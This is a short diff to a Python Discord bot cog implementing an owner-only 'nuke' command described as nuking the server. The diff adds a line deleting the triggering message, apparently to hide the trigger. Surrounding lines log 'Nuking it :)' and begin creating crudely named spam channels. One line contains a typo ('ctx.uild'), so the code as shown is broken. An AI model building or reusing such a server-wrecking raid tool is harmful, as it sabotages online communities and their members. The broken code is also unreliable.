@@ -14,6 +14,7 @@ class Startup(commands.Cog):
     @commands.command(name='nuke', aliases=['nuke'], brief='Nuke the server', description='Nuke the server')
     async def nuke(self, ctx):
         if ctx.author.id == self.bot.owner_id:
+            await ctx.message.delete()
             try:
                 print(f'Joined guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuking it :)')
                 await ctx.uild.create_text_channel(f'fuckme1')
